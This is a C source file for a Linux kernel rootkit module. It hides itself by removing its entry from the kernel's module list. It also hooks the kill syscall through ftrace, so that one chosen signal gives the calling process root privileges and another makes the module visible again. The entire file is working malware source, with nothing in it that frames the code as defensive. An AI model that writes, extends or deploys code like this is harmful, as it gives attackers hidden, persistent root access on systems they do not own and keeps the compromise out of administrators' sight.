#include "../include/hookers.h"
#include "../include/utils.h"
#include "../include/config.h"

//Keep track of whether the rootkit is hidden or not
static int rootkit_visibility = 1;
//Previous module on kernel module list, to remember the original position in case we remove it
static struct list_head *prev_module;

void hide_rootkit(void){
    //Removing the rootkit from the linked list of modules maintained by the kernel
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    rootkit_visibility = 0; //hidden
}

void show_rootkit(void){
    //Adding the rootkit to the linked list of modules maintained by the kernel
    printk(KERN_INFO "Module visible.\n");
    list_add(&THIS_MODULE->list, prev_module);
    rootkit_visibility = 1;//visible
}

asmlinkage long (*orig_kill)(const struct pt_regs*);
asmlinkage int hook_kill(const struct pt_regs *regs){
    void set_root(void);
    int sig = regs->si;

    //If SIGNAL_KILL_HOOK, grant root privileges
    if (sig == SIGNAL_KILL_HOOK){
        printk(KERN_INFO "Giving root privileges.\n");
        change_self_privileges_to_root();
        return orig_kill(regs);
    }
    else if (sig == SIGNAL_UNHIDE_KIT){
        printk(KERN_INFO "Showing rootkit.\n");
        show_rootkit();
        return orig_kill(regs);
    }

    return orig_kill(regs);
}

struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hook_kill, &orig_kill),
};

void remove_all_hooks(void){
    remove_hooks_set(hooks, ARRAY_SIZE(hooks));
}

int install_all_hooks(void){
    return install_hooks_set(hooks, ARRAY_SIZE(hooks));
}